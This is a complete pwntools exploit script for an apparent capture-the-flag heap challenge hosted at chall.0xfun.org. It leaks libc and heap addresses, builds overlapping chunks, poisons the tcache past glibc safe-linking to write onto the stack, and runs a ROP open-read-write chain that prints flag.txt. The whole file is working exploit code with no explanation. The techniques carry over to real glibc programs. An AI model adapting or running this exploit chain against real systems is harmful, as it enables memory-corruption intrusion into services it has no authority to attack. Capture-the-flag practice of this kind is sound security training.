#!/usr/bin/env python3
import os
import re
from pwn import *

# Place chall, libc.so.6, and ld-linux-x86-64.so.2 next to this script for local runs.
os.makedirs("/tmp/pwntools-cache", exist_ok=True)
context.cache_dir = "/tmp/pwntools-cache"
context.binary = elf = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = os.environ.get("LOG", "info")

LD = "./ld-linux-x86-64.so.2"
LIBPATH = "."

UNSORTED_BK_OFF = 0x1E7B20  # main_arena unsorted bk for the provided glibc 2.42

# Stable offsets recovered from the shipped glibc/binary pair.
HDR_A_FROM_LARGEBIN_LEAK = 0x1440
RET_FROM_ENVIRON = 0x150


def start(argv=[]):
    if args.REMOTE:
        host = args.HOST or "chall.0xfun.org"
        port = int(args.PORT or 42443)
        return remote(host, port)
    return process([LD, "--library-path", LIBPATH, elf.path] + argv, stdin=PIPE, stdout=PIPE)


def send_int(io, value: int):
    io.sendline(str(value).encode())


def menu(io, choice: int):
    io.recvuntil(b"> ")
    send_int(io, choice)


def create(io, idx: int, size: int, data: bytes):
    assert 0 <= idx < 16
    assert 0 < size <= 0x500
    menu(io, 1)
    io.recvuntil(b"Index: ")
    send_int(io, idx)
    io.recvuntil(b"Size: ")
    send_int(io, size)
    io.recvuntil(b"Data: ")
    io.send(data)
    io.recvuntil(b"Created!")


def delete(io, idx: int):
    menu(io, 2)
    io.recvuntil(b"Index: ")
    send_int(io, idx)
    io.recvuntil(b"Deleted!")


def read_note(io, idx: int, size: int) -> bytes:
    menu(io, 3)
    io.recvuntil(b"Index: ")
    send_int(io, idx)
    io.recvuntil(b"Data: ")
    out = io.recvn(size)
    io.recvn(1)
    return out


def edit(io, idx: int, data: bytes):
    menu(io, 4)
    io.recvuntil(b"Index: ")
    send_int(io, idx)
    io.recvuntil(b"Data: ")
    io.send(data)
    io.recvuntil(b"Updated!")


def leak_libc_unsorted(io, idx_a: int = 10, idx_b: int = 11) -> int:
    create(io, idx_a, 0x500, b"A" * 8)
    create(io, idx_b, 0x500, b"B" * 8)

    delete(io, idx_a)

    create(io, idx_a, 0x500, b"C" * 8)
    blob = read_note(io, idx_a, 0x500)

    bk = u64(blob[8:16])
    libc_base = bk - UNSORTED_BK_OFF
    log.success(f"unsorted bk leak: {hex(bk)}")
    log.success(f"libc base: {hex(libc_base)}")
    return libc_base


def leak_heap_largebin(io) -> int:
    create(io, 2, 0x4E0, b"a" * 8)
    create(io, 3, 0x20, b"g" * 8)
    create(io, 4, 0x4E0, b"b" * 8)
    create(io, 5, 0x4F0, b"G" * 8)

    delete(io, 2)
    delete(io, 4)

    create(io, 6, 0x500, b"X" * 8)

    create(io, 2, 0x4E0, b"Y" * 8)
    blob = read_note(io, 2, 0x4E0)

    leak_hdr = u64(blob[0x10:0x18])
    if leak_hdr == 0:
        leak_hdr = u64(blob[0x18:0x20])
    if leak_hdr == 0:
        raise ValueError("failed to leak heap pointer from largebin nextsize")
    log.success(f"heap hdr leak (largebin nextsize): {hex(leak_hdr)}")
    return leak_hdr


def safe_link(tcache_entry_addr: int, target: int) -> int:
    return target ^ (tcache_entry_addr >> 12)


def build_orw_chain(libc_base: int, stack_target: int) -> bytes:
    pop_rdi = libc_base + next(libc.search(b"\x5f\xc3", executable=True))
    pop_rsi = libc_base + next(libc.search(b"\x5e\xc3", executable=True))
    pop_rax = libc_base + next(libc.search(b"\x58\xc3", executable=True))
    mov_rdx_rax = libc_base + next(libc.search(b"\x48\x89\xc2\xc3", executable=True))
    syscall_ret = libc_base + next(libc.search(b"\x0f\x05\xc3", executable=True))

    flag_marker = 0xF1A6F1A6F1A6F1A6
    buf_marker = 0xB0F0B0F0B0F0B0F0

    chain = [
        0,
        pop_rax,
        0,
        mov_rdx_rax,
        pop_rax,
        2,
        pop_rdi,
        flag_marker,
        pop_rsi,
        0,
        syscall_ret,
        pop_rdi,
        3,
        pop_rax,
        0x100,
        mov_rdx_rax,
        pop_rax,
        0,
        pop_rsi,
        buf_marker,
        syscall_ret,
        pop_rax,
        0x100,
        mov_rdx_rax,
        pop_rax,
        1,
        pop_rdi,
        1,
        pop_rsi,
        buf_marker,
        syscall_ret,
        pop_rax,
        60,
        pop_rdi,
        0,
        syscall_ret,
    ]

    flag_addr = stack_target + len(chain) * 8
    flag_bytes = b"flag.txt\x00"
    buf_addr = (flag_addr + len(flag_bytes) + 0xF) & ~0xF

    chain = [flag_addr if x == flag_marker else (buf_addr if x == buf_marker else x) for x in chain]
    payload = flat(chain) + flag_bytes
    payload += b"\x00" * ((-len(payload)) & 0xF)
    return payload


def exploit(io):
    leak_hdr = leak_heap_largebin(io)
    hdr_a = leak_hdr + HDR_A_FROM_LARGEBIN_LEAK
    fake = hdr_a + 0x10
    log.success(f"hdr_a: {hex(hdr_a)} fake: {hex(fake)}")

    idx_a = 8
    idx_b = 9
    idx_guard = 13
    create(io, idx_a, 0x4F8, b"A" * 8)
    create(io, idx_b, 0x4F8, b"B" * 8)
    create(io, idx_guard, 0x20, b"G" * 8)

    payload = bytearray(b"\x00" * 0x4F8)
    payload[0x00:0x08] = p64(0)
    payload[0x08:0x10] = p64(0x4F1)
    payload[0x10:0x18] = p64(fake)
    payload[0x18:0x20] = p64(fake)
    payload[0x20:0x28] = p64(0)
    payload[0x28:0x30] = p64(0)
    payload[0x4F0:0x4F8] = p64(0x4F0)

    edit(io, idx_a, bytes(payload))
    delete(io, idx_b)

    create(io, 7, 0x400, b"T" * 8)
    delete(io, 7)
    create(io, 12, 0x3E0, b"U" * 8)
    delete(io, 12)

    libc_base = leak_libc_unsorted(io)
    environ = libc_base + libc.sym["environ"]
    log.success(f"environ: {hex(environ)}")

    tcache1 = fake + 0x10
    target_env = environ - 0x18
    if (target_env & 0xF) != 0:
        raise ValueError("environ-0x18 not 16-aligned; adjust target")

    snap = read_note(io, idx_a, 0x4F8)
    buf = bytearray(snap[:0x20])
    buf[0x10:0x18] = p64(safe_link(tcache1, target_env))
    edit(io, idx_a, bytes(buf))

    create(io, 7, 0x400, b"X" * 8)
    create(io, 0, 0x400, b"Y" * 8)
    leak = read_note(io, 0, 0x400)
    stack_environ = u64(leak[0x18:0x20])
    log.success(f"stack environ: {hex(stack_environ)}")

    ret_addr = stack_environ - RET_FROM_ENVIRON
    stack_target = ret_addr - 8
    if (stack_target & 0xF) != 0:
        raise ValueError("stack_target not 16-aligned; adjust offsets")
    log.success(f"ret_addr: {hex(ret_addr)} stack_target: {hex(stack_target)}")

    tcache2 = fake + 0x420
    snap = read_note(io, idx_a, 0x4F8)
    buf = bytearray(snap[:0x430])
    buf[0x420:0x428] = p64(safe_link(tcache2, stack_target))
    edit(io, idx_a, bytes(buf))

    create(io, 12, 0x3E0, b"Z" * 8)
    rop_payload = build_orw_chain(libc_base, stack_target)
    create(io, 1, 0x3E0, rop_payload)

    out = io.recvall(timeout=2)
    if out:
        match = re.search(rb"0xfun\{[^}\n]+\}", out)
        if match:
            print(match.group().decode())
        else:
            try:
                print(out.decode(errors="ignore"), end="")
            except Exception:
                print(out)


def main():
    io = start()
    exploit(io)
    io.close()


if __name__ == "__main__":
    main()
